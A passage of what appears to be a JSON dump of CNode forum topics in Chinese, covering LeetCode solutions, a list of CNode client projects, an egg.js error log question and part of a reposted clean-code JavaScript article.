} else {\n        obstacleGrid[0][i] = 0\n      }\n    }\n  }\n  for (let i = 0; i &lt; yLen; i++) {\n    if (i - 1 &gt;= 0) {\n      if (obstacleGrid[i-1][0] === 0) {\n        obstacleGrid[i][0] = 0\n      } else if (obstacleGrid[i-1][0] !== 0 &amp;&amp; obstacleGrid[i][0] !== 1) {\n        obstacleGrid[i][0] = 1\n      } else if (obstacleGrid[i-1][0] !== 0 &amp;&amp; obstacleGrid[i][0] === 1) {\n        obstacleGrid[i][0] = 0\n      }\n    }\n  }\n  for (let i = 1; i &lt; yLen; i++) {\n    for (let j = 1; j &lt; xLen; j++) {\n      if (obstacleGrid[i][j] === 1) {\n        obstacleGrid[i][j] = 0\n      } else {\n        obstacleGrid[i][j] = obstacleGrid[i - 1][j] + obstacleGrid[i][j - 1]\n      }\n    }\n  }\n\n  return obstacleGrid[yLen - 1][xLen - 1]\n};\n</code></pre><hr>\n<h3>121. 买卖股票的最佳时机</h3>\n<h4>原题</h4>\n<p>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。如果你最多只允许完成一笔交易（即买入和卖出一支股票），设计一个算法来计算你所能获取的最大利润。</p>\n<p>输入: [7,1,5,3,6,4]</p>\n<p>输出: 5</p>\n<p>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格。</p>\n<h4>思路</h4>\n<p>最大利润即(最高卖出价格 - 最小买入价格)。我们只需要找到最小买入价格后, 计算每一天的利润，取最大值即可</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[]} prices\n * @return {number}\n *&#x2F;\nvar maxProfit = function (prices) {\n\n  if (prices.length === 0) return 0  \n  \n  &#x2F;&#x2F; 利润\n  let result = 0\n  \n  let min = prices[0]\n  &#x2F;&#x2F; 找到最小的谷之后的最大的峰\n  for (let i = 0; i &lt; prices.length; i++) {\n      if (prices[i] &lt; min) {\n          min = prices[i]   \n      }\n      result = Math.max(prices[i] - min, result)\n  } \n  \n  return result\n};\n\n</code></pre><hr>\n<hr>\n</div>","title":"leetcode 部分题解～～～～～～～～～～～～～一直更新～～～～～～～～～～～～～","last_reply_at":"2019-01-16T05:56:41.568Z","good":false,"top":false,"reply_count":2,"visit_count":859,"create_at":"2019-01-14T01:57:59.969Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5c3eb8cba4d44449266b1834","author_id":"577bc10ffb1d649f05fec7ad","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/huruji/eruda-webpack-plugin\">https://github.com/huruji/eruda-webpack-plugin</a></p>\n</div>","title":"写了个 eruda 的 webpack 插件，帮助调试移动端","last_reply_at":"2019-01-16T04:53:31.248Z","good":false,"top":false,"reply_count":0,"visit_count":529,"create_at":"2019-01-16T04:53:31.248Z","author":{"loginname":"huruji","avatar_url":"https://avatars2.githubusercontent.com/u/15937065?v=4&s=120"}},{"id":"5c3d5466a4d44449266b1049","author_id":"5735889dc3e4ef7657ab12f1","tab":"share","content":"<div class=\"markdown-text\"><p><strong>欢迎大家留言补充</strong></p>\n<h1>cnode客户端清单</h1>\n<p><a href=\"https://github.com/cnodejs-client\">https://github.com/cnodejs-client</a></p>\n<p>感谢<a href=\"/user/tomoya92\">@tomoya92</a> 反馈,已经有了一个官方的客户端收录清单.</p>\n<h1>cnode客户端</h1>\n<h2>写在前面</h2>\n<p>做这个清单(后来发现cnode官方维护的清单https://github.com/cnodejs-client ),方便使用不同技术栈客户端,找到参考学习的示例,也希望相同的技术栈的小伙伴,能组织在一起,避免重复的工作,时间精力集中投入到维护一个公共的用户体验良好的客户端产品,一起学习,交流.</p>\n<p>官方清单中,总共有124个(统计截至时间 2019 01.15).各种技术栈重复实现,相同技术栈归为一个版本维护,对技术学习,需求反馈,迭代维护都有好处.</p>\n<p>源码托管在github\n开发进展在cnode中\n平时沟通 微信群 + github-issue + cnode</p>\n<p>刚开始筹备,有兴趣的小伙伴加我进群 185 5088 8388  备注 cnode客户端</p>\n<h2>说明</h2>\n<p>为避免项目,重名,项目名称为 作者_项目名称\n作者 邮箱优先,其次github主页(邮箱从github主页获取,若作者介意邮箱公开,联系我隐藏 <a href=\"mailto:vipzrx@gmail.com\">vipzrx@gmail.com</a>)</p>\n<p>**\n*** author</p>\n<p>*** github</p>\n<p>*** link</p>\n<h2>TakWolf_CNode-Material-Design</h2>\n<p>一直在维护,多个平台发布\n*** author\n<a href=\"https://github.com/TakWolf\">https://github.com/TakWolf</a>\n*** github\n<a href=\"https://github.com/TakWolf/CNode-Material-Design\">https://github.com/TakWolf/CNode-Material-Design</a></p>\n<p>*** link<br>\n<a href=\"https://github.com/TakWolf/CNode-Material-Design\">https://github.com/TakWolf/CNode-Material-Design</a></p>\n<h2>ckinmind_react-cnode</h2>\n<p>使用github托管,慢一些\nfork自 <a href=\"https://github.com/lzxb/react-cnode\">https://github.com/lzxb/react-cnode</a></p>\n<p>*** author\n<a href=\"https://github.com/ckinmind\">https://github.com/ckinmind</a>\n*** github\n<a href=\"https://github.com/ckinmind/react-cnode\">https://github.com/ckinmind/react-cnode</a>\n*** link\n<a href=\"https://ckinmind.github.io/react-cnode\">https://ckinmind.github.io/react-cnode</a></p>\n<h2>lzxb_react-cnode</h2>\n<p>*** author\n<a href=\"https://lzxb.github.io/react-cnode/\">https://lzxb.github.io/react-cnode/</a>\n*** github\n<a href=\"https://github.com/lzxb/react-cnode\">https://github.com/lzxb/react-cnode</a>\n*** link\n<a href=\"https://lzxb.github.io/react-cnode/\">https://lzxb.github.io/react-cnode/</a></p>\n<h2>oodzchen_CNode-V</h2>\n<p>*** author\n<a href=\"mailto:oodzchen@gmail.com\">oodzchen@gmail.com</a>\n*** github\n<a href=\"https://github.com/oodzchen/CNode-V\">https://github.com/oodzchen/CNode-V</a></p>\n<p>*** link\n<a href=\"https://cnode.ikholin.com/#/\">https://cnode.ikholin.com/#/</a></p>\n</div>","title":"cnode客户端(整理中)","last_reply_at":"2019-01-16T03:14:51.381Z","good":false,"top":false,"reply_count":5,"visit_count":733,"create_at":"2019-01-15T03:32:54.074Z","author":{"loginname":"vipzrx","avatar_url":"https://avatars1.githubusercontent.com/u/5094958?v=4&s=120"}},{"id":"5c3e0f67a4d44449266b15ea","author_id":"5942903bff5813233faad8a9","tab":"share","content":"<div class=\"markdown-text\"><p><strong><a href=\"https://github.com/wbget/cnode-react\">cnode-react</a></strong>\n使用 <strong><a href=\"https://umijs.org/zh/\">umijs</a> + <a href=\"https://dvajs.com/\">dva</a> + <a href=\"https://mobile.ant.design/\">ant-mobile</a></strong>\n这个项目目的在于，学习熟悉 umijs，dva，ant-mobile，还有PWA。\n目前完成实现到了分页预览。\n<strong>社区的markdown怎么渲染，求帮助～</strong></p>\n</div>","title":"一个react版本PWA社区(完成20%)","last_reply_at":"2019-01-16T03:13:53.798Z","good":false,"top":false,"reply_count":3,"visit_count":620,"create_at":"2019-01-15T16:50:47.232Z","author":{"loginname":"wbget","avatar_url":"https://avatars0.githubusercontent.com/u/12776391?v=4&s=120"}},{"id":"5c3d8491a4d44449266b1280","author_id":"5c3d7efca4d44449266b1250","tab":"ask","content":"<div class=\"markdown-text\"><p>1、问题：线上用docker部署了两个egg实例服务，其中一台会出现以下错误,另外一台正常\n报错频率:不定时的出现  查看错误日志 并没有业务错误  暂时找不到复现规律\n版本如下：\n\t\tnode版本:v8.9.4\n\t\t“cross-env”: “^5.2.0”,\n“crypto”: “^1.0.1”,\n“egg”: “^2.2.1”,\n“egg-cors”: “^2.1.0”,\n“egg-mongoose”: “^2.2.1”,\n“egg-router-plus”: “^1.2.2”,\n“egg-scripts”: “^2.5.0”,\n“egg-session-mongo”: “^2.0.0”,\n“<a href=\"http://egg-socket.io\">egg-socket.io</a>”: “^4.1.1”,\n“egg-validate”: “^2.0.0”,\n\t\tscripts&quot;: {\n“build”: “cross-env EGG_SERVER_ENV=prod egg-scripts start --title=ad-service --sticky”,\n“stop”: “egg-scripts stop --title=egg-server-example”,\n“dev”: “egg-bin dev --sticky”,\n“debug”: “egg-bin debug”,\n“test”: “cross-env EGG_SERVER_ENV=test egg-scripts start --sticky”,\n“test-local”: “egg-bin test”,\n“cov”: “egg-bin cov”,\n“lint”: “eslint .”,\n“ci”: “npm run lint &amp;&amp; npm run cov”,\n“autod”: “autod”\n},</p>\n<pre class=\"prettyprint\"><code>[Mon Jan 14 2019 16:50:31 GMT+0800 (CST)] [graceful:worker:56:uncaughtException] throw error 1 times\n{ ECONNRESETError: read ECONNRESET (uncaughtException throw 1 times on pid:56)\n    at _errnoException (util.js:1022:11)\n    at TCP.onread (net.js:615:25)\n  code: &#x27;ECONNRESET&#x27;,\n  errno: &#x27;ECONNRESET&#x27;,\n  syscall: &#x27;read&#x27;,\n  name: &#x27;ECONNRESETError&#x27; }\nECONNRESETError: read ECONNRESET (uncaughtException throw 1 times on pid:56)\n    at _errnoException (util.js:1022:11)\n    at TCP.onread (net.js:615:25)\n[Mon Jan 14 2019 16:50:31 GMT+0800 (CST)] [graceful:worker:56] will exit after 30000ms\n[Mon Jan 14 2019 16:50:31 GMT+0800 (CST)] [graceful:worker:56] close server#0, _connections: 0\n[Mon Jan 14 2019 16:50:31 GMT+0800 (CST)] [graceful:worker:56] close 1 servers!\n[Mon Jan 14 2019 16:50:31 GMT+0800 (CST)] [graceful:worker:56] worker disconnect!\n[2019-01-14 16:50:31.429] [cfork:master:35] worker:56 disconnect (exitedAfterDisconnect: true, state: disconnected, isDead: false, worker.disableRefork: false)\n[2019-01-14 16:50:31.431] [cfork:master:35] new worker:268 fork (state: none)\n2019-01-14 16:50:31,431 INFO 35 [master] app_worker#2:56 disconnect, suicide: true, state: disconnected, current workers: [&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;5&quot;,&quot;6&quot;]\n2019-01-14 16:50:31,432 INFO 35 [master] app_worker#6:268 start, state: none, current workers: [&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;5&quot;,&quot;6&quot;]\n2019-01-14 16:50:31,771 INFO 268 Plugin development is disabled by env unmatched, require env(local) but got env is prod\n2019-01-14 16:50:31,787 INFO 268 [egg:core] App root: &#x2F;home&#x2F;project\n2019-01-14 16:50:31,788 INFO 268 [egg:core] All *.log files save on &quot;&#x2F;root&#x2F;logs&#x2F;&quot;\n</code></pre><p>然后 报这个错</p>\n<pre class=\"prettyprint\"><code>2019-01-14 16:50:32,783 INFO 268 [egg:core:ready_stat] end ready task &#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-watcher&#x2F;lib&#x2F;init.js:15:14, remain []\n2019-01-14 16:50:32,806 INFO 35 [master] app_worker#6:268 started at 3737, remain 0 (887692202ms)\n[2019-01-14 16:50:42.973] [cfork:master:35] master uncaughtException: Error [ERR_IPC_CHANNEL_CLOSED]: channel closed\n    at ChildProcess.target.send (internal&#x2F;child_process.js:588:16)\n    at Worker.send (internal&#x2F;cluster&#x2F;worker.js:54:28)\n    at Server.require.createServer.connection (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:164:16)\n    at emitOne (events.js:116:13)\n    at Server.emit (events.js:211:7)\n    at TCP.onconnection (net.js:1561:8)\nError [ERR_IPC_CHANNEL_CLOSED]: channel closed\n    at ChildProcess.target.send (internal&#x2F;child_process.js:588:16)\n    at Worker.send (internal&#x2F;cluster&#x2F;worker.js:54:28)\n    at Server.require.createServer.connection (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:164:16)\n    at emitOne (events.js:116:13)\n    at Server.emit (events.js:211:7)\n    at TCP.onconnection (net.js:1561:8)\n(total 2 disconnect, 0 unexpected exit)\n[2019-01-14 16:50:52.691] [cfork:master:35] master uncaughtException: Error [ERR_IPC_CHANNEL_CLOSED]: channel closed\n    at ChildProcess.target.send (internal&#x2F;child_process.js:588:16)\n    at Worker.send (internal&#x2F;cluster&#x2F;worker.js:54:28)\n    at Server.require.createServer.connection (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:164:16)\n    at emitOne (events.js:116:13)\n    at Server.emit (events.js:211:7)\n    at TCP.onconnection (net.js:1561:8)\nError [ERR_IPC_CHANNEL_CLOSED]: channel closed\n    at ChildProcess.target.send (internal&#x2F;child_process.js:588:16)\n    at Worker.send (internal&#x2F;cluster&#x2F;worker.js:54:28)\n    at Server.require.createServer.connection (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:164:16)\n    at emitOne (events.js:116:13)\n    at Server.emit (events.js:211:7)\n    at TCP.onconnection (net.js:1561:8)\n(total 2 disconnect, 0 unexpected exit)\n[Mon Jan 14 2019 16:51:01 GMT+0800 (CST)] [graceful:worker:56] kill timeout, exit now.\n2019-01-14 16:51:01,438 ERROR 56 [app_worker] exit with code:1\n[2019-01-14 16:51:01.446] [cfork:master:35] worker:56 exit (code: 1, exitedAfterDisconnect: true, state: dead, isDead: true, isExpected: true, worker.disableRefork: false)\n2019-01-14 16:51:01,446 ERROR 35 nodejs.AppWorkerDiedError: [master] app_worker#2:56 died (code: 1, signal: null, suicide: true, state: dead), current workers: [&quot;1&quot;,&quot;3&quot;,&quot;5&quot;,&quot;6&quot;]\n    at Master.onAppExit (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:398:21)\n    at emitOne (events.js:116:13)\n    at Master.emit (events.js:211:7)\n    at Messenger.sendToMaster (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;utils&#x2F;messenger.js:137:17)\n    at Messenger.send (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;utils&#x2F;messenger.js:102:12)\n    at EventEmitter.cluster.on (&#x2F;home&#x2F;project&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;master.js:267:22)\n    at emitThree (events.js:141:20)\n    at EventEmitter.emit (events.js:217:7)\n    at ChildProcess.worker.process.once (internal&#x2F;cluster&#x2F;master.js:185:13)\n    at Object.onceWrapper (events.js:317:30)\nname: &quot;AppWorkerDiedError&quot;\npid: 35\n</code></pre></div>","title":"请教一个egg的问题 报\"ERR_IPC_CHANNEL_CLOSED\"这个错误 麻烦各位大神帮忙看下 多谢","last_reply_at":"2019-01-16T03:04:07.983Z","good":false,"top":false,"reply_count":4,"visit_count":785,"create_at":"2019-01-15T06:58:25.452Z","author":{"loginname":"houxiaofei123","avatar_url":"https://avatars0.githubusercontent.com/u/40034398?v=4&s=120"}},{"id":"5c395d8ba4d44449266b0064","author_id":"57346bbf32bf2c90579f529f","tab":"ask","content":"<div class=\"markdown-text\"><p>model的定义使用了comment：\n<img src=\"//static.cnodejs.org/FhALrX6ELN5s4RjRJTTodLE5H6L_\" alt=\"QQ截图20190112112104.jpg\"></p>\n<p>生成的sql语句中没有comment\n<img src=\"//static.cnodejs.org/FnmRuwpwNocAOQwcqhK-5D9kU4oL\" alt=\"QQ截图20190112112123.jpg\"></p>\n</div>","title":"egg-sequelize中定义model的描述comment好像不起作用，无法再mysql中生成描述？","last_reply_at":"2019-01-16T02:55:08.448Z","good":false,"top":false,"reply_count":7,"visit_count":764,"create_at":"2019-01-12T03:22:51.547Z","author":{"loginname":"dpc761218914","avatar_url":"https://avatars3.githubusercontent.com/u/16233212?v=4&s=120"}},{"id":"5c35673e3898674067a7cec3","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 可以说是《Clean Code》的JS代码示例了，值得参考。</p>\n<ul>\n<li>原文：<a href=\"https://juejin.im/post/5c24b7a851882509a76875e8\">JavaScript 代码简洁之道</a></li>\n<li>作者：<a href=\"https://juejin.im/user/57df39fca0bb9f0058a3c63d\">缪宇</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p><strong>测试代码质量的唯一方式：别人看你代码时说 f * k 的次数。</strong></p>\n<p>代码质量与其整洁度成正比。干净的代码，既在质量上较为可靠，也为后期维护、升级奠定了良好基础。</p>\n<p>本文并不是代码风格指南，而是关于代码的<code>可读性</code>、<code>复用性</code>、<code>扩展性</code>探讨。</p>\n<p>我们将从几个方面展开讨论：</p>\n<ul>\n<li>变量</li>\n<li>函数</li>\n<li>对象和数据结构</li>\n<li>类</li>\n<li>SOLID</li>\n<li>测试</li>\n<li>异步</li>\n<li>错误处理</li>\n<li>代码风格</li>\n<li>注释</li>\n</ul>\n<h3>变量</h3>\n<h4>用有意义且常用的单词命名变量</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code> const yyyymmdstr = moment().format(&#x27;YYYY&#x2F;MM&#x2F;DD&#x27;);\n</code></pre><p><strong>Good:</strong></p>\n<pre class=\"prettyprint language-js\"><code> const currentDate = moment().format(&#x27;YYYY&#x2F;MM&#x2F;DD&#x27;);\n</code></pre><h4>保持统一</h4>\n<p>可能同一个项目对于获取用户信息，会有三个不一样的命名。应该保持统一，如果你不知道该如何取名，可以去 <a href=\"https://unbug.github.io/codelf/\">codelf</a> 搜索，看别人是怎么取名的。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>getUserInfo();\ngetClientData();\ngetCustomerRecord();\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>getUser()\n</code></pre><h4>每个常量都该命名</h4>\n<p>可以用 <a href=\"https://github.com/danielstjules/buddy.js\">buddy.js</a> 或者 <a href=\"https://github.com/eslint/eslint/blob/660e0918933e6e7fede26bc675a0763a6b357c94/docs/rules/no-magic-numbers.md\">ESLint</a> 检测代码中未命名的常量。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 三个月之后你还能知道 86400000 是什么吗?\nsetTimeout(blastOff, 86400000);\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const MILLISECOND_IN_A_DAY = 86400000;\n\nsetTimeout(blastOff, MILLISECOND_IN_A_DAY);\n</code></pre><h4>可描述</h4>\n<p>通过一个变量生成了一个新变量，也需要为这个新变量命名，也就是说每个变量当你看到他第一眼你就知道他是干什么的。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const ADDRESS = &#x27;One Infinite Loop, Cupertino 95014&#x27;;\nconst CITY_ZIP_CODE_REGEX = &#x2F;^[^,\\\\]+[,\\\\\\s]+(.+?)\\s*(\\d{5})?$&#x2F;;\nsaveCityZipCode(ADDRESS.match(CITY_ZIP_CODE_REGEX)[1], address.match(CITY_ZIP_CODE_REGEX)[2]);\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const ADDRESS = &#x27;One Infinite Loop, Cupertino 95014&#x27;;\nconst CITY_ZIP_CODE_REGEX = &#x2F;^[^,\\\\]+[,\\\\\\s]+(.+?)\\s*(\\d{5})?$&#x2F;;\nconst [, city, zipCode] = ADDRESS.match(CITY_ZIP_CODE_REGEX) || [];\nsaveCityZipCode(city, zipCode);\n</code></pre><h4>直接了当</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const locations = [&#x27;Austin&#x27;, &#x27;New York&#x27;, &#x27;San Francisco&#x27;];\nlocations.forEach((l) =&gt; {\n  doStuff();\n  doSomeOtherStuff();\n  &#x2F;&#x2F; ...\n  &#x2F;&#x2F; ...\n  &#x2F;&#x2F; ...\n  &#x2F;&#x2F; 需要看其他代码才能确定 &#x27;l&#x27; 是干什么的。\n  dispatch(l);\n});\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const locations = [&#x27;Austin&#x27;, &#x27;New York&#x27;, &#x27;San Francisco&#x27;];\nlocations.forEach((location) =&gt; {\n  doStuff();\n  doSomeOtherStuff();\n  &#x2F;&#x2F; ...\n  &#x2F;&#x2F; ...\n  &#x2F;&#x2F; ...\n  dispatch(location);\n});\n</code></pre><h4>避免无意义的前缀</h4>\n<p>如果创建了一个对象 car，就没有必要把它的颜色命名为 carColor。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const car = {\n  carMake: &#x27;Honda&#x27;,\n  carModel: &#x27;Accord&#x27;,\n  carColor: &#x27;Blue&#x27;\n};\n\nfunction paintCar(car) {\n  car.carColor = &#x27;Red&#x27;;\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const car = {\n  make: &#x27;Honda&#x27;,\n  model: &#x27;Accord&#x27;,\n  color: &#x27;Blue&#x27;\n};\n\nfunction paintCar(car) {\n  car.color = &#x27;Red&#x27;;\n}\n</code></pre><h4>使用默认值</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function createMicrobrewery(name) {\n  const breweryName = name || &#x27;Hipster Brew Co.&#x27;;\n  &#x2F;&#x2F; ...\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function createMicrobrewery(name = &#x27;Hipster Brew Co.&#x27;) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><h3>函数</h3>\n<h4>参数越少越好</h4>\n<p>如果参数超过两个，使用 <code>ES2015/ES6</code> 的解构语法，不用考虑参数的顺序。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function createMenu(title, body, buttonText, cancellable) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function createMenu({ title, body, buttonText, cancellable }) {\n  &#x2F;&#x2F; ...\n}\n\ncreateMenu({\n  title: &#x27;Foo&#x27;,\n  body: &#x27;Bar&#x27;,\n  buttonText: &#x27;Baz&#x27;,\n  cancellable: true\n});\n</code></pre><h4>只做一件事情</h4>\n<p>这是一条在软件工程领域流传久远的规则。严格遵守这条规则会让你的代码可读性更好，也更容易重构。如果违反这个规则，那么代码会很难被测试或者重用。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function emailClients(clients) {\n  clients.forEach((client) =&gt; {\n    const clientRecord = database.lookup(client);\n    if (clientRecord.isActive()) {\n      email(client);\n    }\n  });\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function emailActiveClients(clients) {\n  clients\n    .filter(isActiveClient)\n    .forEach(email);\n}\nfunction isActiveClient() {\n  const clientRecord = database.lookup(client);    \n  return clientRecord.isActive();\n}\n</code></pre><h4>顾名思义</h4>\n<p>看函数名就应该知道它是干啥的。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function addToDate(date, month) {\n  &#x2F;&#x2F; ...\n}\n\nconst date = new Date();\n\n&#x2F;&#x2F; 很难知道是把什么加到日期中\naddToDate(date, 1);\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function addMonthToDate(month, date) {\n  &#x2F;&#x2F; ...\n}\n\nconst date = new Date();\naddMonthToDate(1, date);\n</code></pre><h4>只需要一层抽象层</h4>\n<p>如果函数嵌套过多会导致很难复用以及测试。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function parseBetterJSAlternative(code) {\n  const REGEXES = [\n    &#x2F;&#x2F; ...\n  ];\n\n  const statements = code.split(&#x27; &#x27;);\n  const tokens = [];\n  REGEXES.forEach((REGEX) =&gt; {\n    statements.forEach((statement) =&gt; {\n      &#x2F;&#x2F; ...\n    });\n  });\n\n  const ast = [];\n  tokens.forEach((token) =&gt; {\n    &#x2F;&#x2F; lex...\n  });\n\n  ast.forEach((node) =&gt; {\n    &#x2F;&#x2F; parse...\n  });\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function parseBetterJSAlternative(code) {\n  const tokens = tokenize(code);\n  const ast = lexer(tokens);\n  ast.forEach((node) =&gt; {\n    &#x2F;&#x2F; parse...\n  });\n}\n\nfunction tokenize(code) {\n  const REGEXES = [\n    &#x2F;&#x2F; ...\n  ];\n\n  const statements = code.split(&#x27; &#x27;);\n  const tokens = [];\n  REGEXES.forEach((REGEX) =&gt; {\n    statements.forEach((statement) =&gt; {\n      tokens.push( &#x2F;* ... *&#x2F; );\n    });\n  });\n\n  return tokens;\n}\n\nfunction lexer(tokens) {\n  const ast = [];\n  tokens.forEach((token) =&gt; {\n    ast.push( &#x2F;* ... *&#x2F; );\n  });\n\n  return ast;\n}\n</code></pre><h4>删除重复代码</h4>\n<p>很多时候虽然是同一个功能，但由于一两个不同点，让你不得不写两个几乎相同的函数。</p>\n<p>要想优化重复代码需要有较强的抽象能力，错误的抽象还不如重复代码。所以在抽象过程中必须要遵循 <code>SOLID</code> 原则（<code>SOLID</code> 是什么？稍后会详细介绍）。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function showDeveloperList(developers) {\n  developers.forEach((developer) =&gt; {\n    const expectedSalary = developer.calculateExpectedSalary();\n    const experience = developer.getExperience();\n    const githubLink = developer.getGithubLink();\n    const data = {\n      expectedSalary,\n      experience,\n      githubLink\n    };\n\n    render(data);\n  });\n}\n\nfunction showManagerList(managers) {\n  managers.forEach((manager) =&gt; {\n    const expectedSalary = manager.calculateExpectedSalary();\n    const experience = manager.getExperience();\n    const portfolio = manager.getMBAProjects();\n    const data = {\n      expectedSalary,\n      experience,\n      portfolio\n    };\n\n    render(data);\n  });\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function showEmployeeList(employees) {\n  employees.forEach(employee =&gt; {\n    const expectedSalary = employee.calculateExpectedSalary();\n    const experience = employee.getExperience();\n    const data = {\n      expectedSalary,\n      experience,\n    };\n    \n    switch(employee.type) {\n      case &#x27;develop&#x27;:\n        data.githubLink = employee.getGithubLink();\n        break\n      case &#x27;manager&#x27;:\n        data.portfolio = employee.getMBAProjects();\n        break\n    }\n    render(data);\n  })\n}\n</code></pre><h4>对象设置默认属性</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const menuConfig = {\n  title: null,\n  body: &#x27;Bar&#x27;,\n  buttonText: null,\n  cancellable: true\n};\n\nfunction createMenu(config) {\n  config.title = config.title || &#x27;Foo&#x27;;\n  config.body = config.body || &#x27;Bar&#x27;;\n  config.buttonText = config.buttonText || &#x27;Baz&#x27;;\n  config.cancellable = config.cancellable !== undefined ? config.cancellable : true;\n}\n\ncreateMenu(menuConfig);\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const menuConfig = {\n  title: &#x27;Order&#x27;,\n  &#x2F;&#x2F; &#x27;body&#x27; key 缺失\n  buttonText: &#x27;Send&#x27;,\n  cancellable: true\n};\n\nfunction createMenu(config) {\n  config = Object.assign({\n    title: &#x27;Foo&#x27;,\n    body: &#x27;Bar&#x27;,\n    buttonText: &#x27;Baz&#x27;,\n    cancellable: true\n  }, config);\n\n  &#x2F;&#x2F; config 就变成了: {title: &quot;Order&quot;, body: &quot;Bar&quot;, buttonText: &quot;Send&quot;, cancellable: true}\n  &#x2F;&#x2F; ...\n}\n\ncreateMenu(menuConfig);\n</code></pre><h4>不要传 flag 参数</h4>\n<p>通过 flag 的 true 或 false，来判断执行逻辑，违反了一个函数干一件事的原则。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function createFile(name, temp) {\n  if (temp) {\n    fs.create(&#96;.&#x2F;temp&#x2F;${name}&#96;);\n  } else {\n    fs.create(name);\n  }\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function createFile(name) {\n  fs.create(name);\n}\nfunction createFileTemplate(name) {\n  createFile(&#96;.&#x2F;temp&#x2F;${name}&#96;)\n}\n</code></pre><h4>避免副作用（第一部分）</h4>\n<p>函数接收一个值返回一个新值，除此之外的行为我们都称之为副作用，比如修改全局变量、对文件进行 IO 操作等。\n当函数确实需要副作用时，比如对文件进行 IO 操作时，请不要用多个函数/类进行文件操作，有且仅用一个函数/类来处理。也就是说副作用需要在唯一的地方处理。\n副作用的三大天坑：随意修改可变数据类型、随意分享没有数据结构的状态、没有在统一地方处理副作用。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 全局变量被一个函数引用\n&#x2F;&#x2F; 现在这个变量从字符串变成了数组，如果有其他的函数引用，会发生无法预见的错误。\nvar name = &#x27;Ryan McDermott&#x27;;\n\nfunction splitIntoFirstAndLastName() {\n  name = name.split(&#x27; &#x27;);\n}\n\nsplitIntoFirstAndLastName();\n\nconsole.log(name); &#x2F;&#x2F; [&#x27;Ryan&#x27;, &#x27;McDermott&#x27;];\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>var name = &#x27;Ryan McDermott&#x27;;\nvar newName = splitIntoFirstAndLastName(name)\n\nfunction splitIntoFirstAndLastName(name) {\n  return name.split(&#x27; &#x27;);\n}\n\nconsole.log(name); &#x2F;&#x2F; &#x27;Ryan McDermott&#x27;;\nconsole.log(newName); &#x2F;&#x2F; [&#x27;Ryan&#x27;, &#x27;McDermott&#x27;];\n</code></pre><h4>避免副作用（第二部分）</h4>\n<p>在 JavaScript 中，基本类型通过赋值传递，对象和数组通过引用传递。以引用传递为例：\n假如我们写一个购物车，通过 